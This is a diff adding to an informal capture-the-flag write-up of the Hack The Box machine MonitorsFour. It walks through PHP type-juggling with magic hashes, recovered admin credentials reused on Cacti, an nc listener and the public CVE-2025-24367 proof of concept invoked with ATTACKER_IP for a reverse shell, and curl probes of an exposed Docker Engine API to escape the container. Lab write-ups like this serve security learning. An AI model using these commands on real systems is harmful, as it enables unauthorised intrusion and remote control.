@@ -120,4 +120,76 @@ apparently we can exploit "type juggling" to...do something.
 
 we can use this to steal tokens, combined with this fact from PHP:
 
-    Specific “Magic Hashes” (strings starting with `0e` followed by numbers) are treated as scientific notation (float) `0` by PHP during loose comparison.
+    Specific “Magic Hashes” (strings starting with `0e` followed by numbers) are treated as scientific notation (float) `0` by PHP during loose comparison.
+
+let's try some of this on our own without peeking.
+
+well. i have no clue why it worked, but we're further along.
+
+    "username": "admin",
+    "email": "admin@monitorsfour.htb",
+    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
+    "password_": "wonderful1"
+
+
+http://monitorsfour.htb/admin/api
+
+neat. api key gen. wonder what we can use it for.
+
+http://monitorsfour.htb/admin/changelog
+
+
+useful. changelog.
+
+so.
+
+cacti login is 
+
+    marcus
+    wonderful1
+    
+the admin's name is marcus.
+
+okay.
+
+so apparently CVE-2025–24367 gives us RCE if we're authenticated.
+
+https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC
+
+```bash
+export ATTACKER_IP=10.10.14.175
+nc -nvlp 4444
+
+python CVE-2025–24367.py -u 'marcus' -p 'wonderful1' -i $ATTACKER_IP -l 4444 --url 'http://cacti.monitorsfour.htb'
+```
+
+hooray!! we have a shell. it sucks a bit, but, it's a shell!!
+
+I'm going to ask z.ai what I should do next. user flag gotten!!
+
+dang. z.ai is smart.
+
+so i told it we have a crappy shell, but A SHELL is still useful than NO SHELL
+
+(so no shell? (sounds of incredible muffled violence))
+
+getting root inside the docker container is probably a waste of our time? not sure.
+
+    Exploiting Docker Engine API
+    The Docker Engine API was accessible at http://192.168.65.7:2375. A new privileged container was created with host filesystem access to escape to the host.
+
+no way I was going to get this on my own, but, it's okay. I'm still learning.
+
+okay.
+
+## escaping a WSL docker container to the host
+
+### 1. find the host IP.
+    
+    cat /etc/resolv.conf
+    
+### 2. make sure the docker API is accessible.
+
+    curl http://192.168.65.7:2375/version
+
+    curl -s http://192.168.65.7:2375/images/json
